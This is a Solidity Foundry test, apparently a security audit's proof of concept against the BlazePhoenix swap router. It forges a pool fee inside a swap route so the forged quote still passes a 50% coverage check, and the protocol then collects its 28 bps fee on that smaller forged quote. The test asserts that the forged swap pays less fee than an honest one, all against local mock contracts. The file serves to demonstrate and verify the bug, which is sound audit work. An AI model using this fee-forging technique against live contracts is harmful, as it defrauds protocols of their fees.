// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.36;
import {Test} from "forge-std/Test.sol";
import {BlazePhoenixHub} from "../src/BlazePhoenixHub.sol";
import {BlazePhoenixSolver} from "../src/BlazePhoenixSolver.sol";
import {BlazePhoenixRouter} from "../src/BlazePhoenixRouter.sol";
import {BlazePhoenixCore as BPC, Route, Hop, Leg} from "../src/BlazePhoenixCore.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockV3Pool} from "./mocks/MockV3Pool.sol";

contract FindingPartialFeeForgeTest is Test {
    BlazePhoenixHub hub; BlazePhoenixSolver solver; BlazePhoenixRouter router;
    MockERC20 tokenA; MockERC20 tokenB; MockV3Pool pool;
    address user = address(0xBEEF);
    address constant T1 = address(0xFEE1); address constant T2 = address(0xFEE2);
    uint256 constant PROTOCOL_FEE_BPS = 28; uint256 constant MIN_QUOTE_COVERAGE_BPS = 5_000;
    uint160 constant SQRT_P_1 = 79228162514264337593543950336;
    uint128 constant LIQ = 1_000_000e18; uint24 constant POOL_FEE = 3000;
    uint256 constant AMOUNT_IN = 10_000e18;
    bool zfo;

    function setUp() public {
        hub = new BlazePhoenixHub(address(this));
        hub.initialize(address(this), address(0));
        solver = new BlazePhoenixSolver(address(hub));
        router = new BlazePhoenixRouter(address(hub), address(solver), address(this), T1, T2);
        hub.setRoles(address(router), address(solver), address(this));
        tokenA = new MockERC20("A", "A"); tokenB = new MockERC20("B", "B");
        pool = new MockV3Pool(address(tokenA), address(tokenB), POOL_FEE);
        pool.setState(SQRT_P_1, LIQ);
        tokenB.mint(address(pool), 1_000_000e18);
        hub.seedPool(address(pool), BPC.KIND_V3, POOL_FEE, address(0), address(tokenA), address(tokenB));
        zfo = pool.token0() == address(tokenA);
        tokenA.mint(user, 1_000_000e18);
        vm.prank(user); tokenA.approve(address(router), type(uint256).max);
    }
    function _route(uint24 legFee) internal view returns (Route memory r) {
        Leg[] memory legs = new Leg[](1);
        legs[0] = Leg({pool: address(pool), hooks: address(0), kind: BPC.KIND_V3,
            fee: legFee, tickSpacing: 0, zeroForOne: zfo, stable: false,
            amountIn: AMOUNT_IN, expectedOut: 0, auxId: bytes32(0)});
        Hop[] memory hops = new Hop[](1);
        hops[0] = Hop({tokenIn: address(tokenA), tokenOut: address(tokenB),
            amountIn: AMOUNT_IN, expectedOut: 0, legs: legs});
        r = Route({hops: hops, totalOut: 0, singleOut: 0, singleOutFloor: 0,
            expectedImpactBps: 0, confidenceWad: 0, estGas: 0,
            hasSurplus: false, isV4Bundle: false});
    }
    function _grossOut() internal view returns (uint256) { return BPC.outV3(AMOUNT_IN, SQRT_P_1, LIQ, POOL_FEE, zfo); }
    function _treasuries() internal view returns (uint256) { return tokenB.balanceOf(T1) + tokenB.balanceOf(T2); }

    function test_PartialForge_EvadesHalfTheFee() public {
        uint24 forged = 500_000;
        uint256 gross = _grossOut();
        uint256 forgedQuote = BPC.outV3(AMOUNT_IN, SQRT_P_1, LIQ, forged, zfo);
        uint256 coverage = BPC.mulDiv(forgedQuote, 10_000, gross);
        assertGt(forgedQuote, 0, "setup: forged quote non-zero");
        assertGe(coverage, MIN_QUOTE_COVERAGE_BPS, "setup: forged quote clears the 50% bar");
        assertLt(forgedQuote, gross, "setup: forged quote below delivered output");
        uint256 tBefore = _treasuries();
        vm.prank(user);
        uint256 delivered = router.swapExactIn(_route(forged), AMOUNT_IN, 1, user, block.timestamp + 1);
        uint256 collected = _treasuries() - tBefore;
        uint256 honestFee = BPC.mulDiv(gross, PROTOCOL_FEE_BPS, BPC.BPS);
        uint256 forgedFee = BPC.mulDiv(forgedQuote, PROTOCOL_FEE_BPS, BPC.BPS);
        assertEq(delivered, gross - collected, "user receives gross minus collected fee");
        assertApproxEqRel(collected, forgedFee, 0.01e18, "fee = 28bps of forged quote");
        assertLt(collected, honestFee, "collected fee must be below the honest fee");
        uint256 t0 = _treasuries();
        vm.prank(user);
        router.swapExactIn(_route(POOL_FEE), AMOUNT_IN, 1, user, block.timestamp + 1);
        uint256 honestCollected = _treasuries() - t0;
        assertApproxEqRel(honestCollected, honestFee, 0.01e18, "honest swap collects full fee");
        emit log_named_uint("collected_forged", collected);
        emit log_named_uint("collected_honest", honestCollected);
        emit log_named_uint("forged_quote", forgedQuote);
        emit log_named_uint("gross_out", gross);
        assertLt(collected, honestCollected, "forged fee must collect less than honest");
    }
}
